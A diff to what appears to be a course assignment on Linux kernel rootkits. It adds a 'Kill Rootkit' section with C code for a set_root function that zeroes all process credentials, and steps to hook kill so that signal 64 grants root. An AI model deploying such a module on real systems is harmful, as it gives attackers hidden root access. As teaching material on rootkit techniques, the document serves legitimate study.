@@ -58,11 +58,51 @@ For part 2, you will need to:
 
 3. Compile the code using the [Makefile](https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.4_hiding_directories/Makefile) provided in the Xcellerator's Github repo.
 
-4.Insert the kernel module using `insmod`.
+4. Insert the kernel module using `insmod`.
 
 5. Create some directories whose names match your keyword. Try using `ls` to list them. Do they show up?
 
 Once you get your rootkit working, take screenshots of your demo for your writeup.
 
-# Multi Rootkit
+# Part 3: Kill Rootkit
 
+Now that you have your Directory Hiding Rootkit working, it's time to move on to something a little more malicious: `kill` commands. If you are unfamiliar with the `kill` command, it's used in conjunction with a number associated with a process to immediately end it. 
+
+For more context, read TheXcellerator's post [here](https://xcellerator.github.io/posts/linux_rootkits_03/).
+
+For this part, you will need to:
+
+1. Copy the [code](https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.2_kill_signalling/rootkit.c) for the kill signaling rootkit.
+
+2. Add the `set_root` function; 
+```c
+void set_root(void)
+{
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return;
+
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    commit_creds(root);
+}
+```
+
+3. Complete the hook and ftrace like you did in Part 2.
+
+4. Compile the code into a makefile.
+
+5. Insert the rootkit using `insmod`.
+
+6. Send signal `64` to any process (i.e. `kill -64 1`).
+
+7. Use the command `id` to see the result of your hard work.
+
+Congratulations! You are root! 
+
+# Multi Rootkit
